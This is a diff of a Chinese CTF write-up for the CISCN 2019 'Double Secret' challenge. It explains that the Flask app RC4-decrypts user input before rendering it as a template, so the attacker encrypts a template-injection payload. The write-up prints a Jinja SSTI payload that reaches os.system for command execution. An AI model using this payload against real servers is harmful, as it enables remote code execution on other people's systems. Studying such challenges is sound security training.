@@ -1,13 +1,14 @@
-#SSTI 
+#SSTI
 存在 /secret 目录
 
 传参 secret 在 报错页面有部分 app.py 代码
+
 ```python
     if(secret==None):
         return 'Tell me your secret.I will encrypt it so others can\'t see'
     rc=rc4_Modified.RC4("HereIsTreasure")   #解密
     deS=rc.do_crypt(secret)
-    
+
     a=render_template_string(safe(deS))
 
     if 'ciscn' in a.lower():
@@ -15,7 +16,7 @@
     return a
 ```
 
-RC4是一种加密算法，对称加密，对明文加密一次得到密文，对密文加密一次又会得到明文
+RC4 是一种加密算法，对称加密，对明文加密一次得到密文，对密文加密一次又会得到明文
 如果我们输入密文，则返回的是明文
 
 ```python
@@ -70,9 +71,10 @@ rc4_main("key", "text")
 之后利用模板注入，将 payload 加密后传入
 
 利用 os
+
 ```python
 ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
 ```
-参考
-[[CISCN 2019华东南]Double Secret_ph0ebus的博客-CSDN博客](https://blog.csdn.net/qq_46266259/article/details/128920290)
 
+参考
+[[CISCN 2019 华东南]Double Secret_ph0ebus 的博客-CSDN 博客](https://blog.csdn.net/qq_46266259/article/details/128920290)
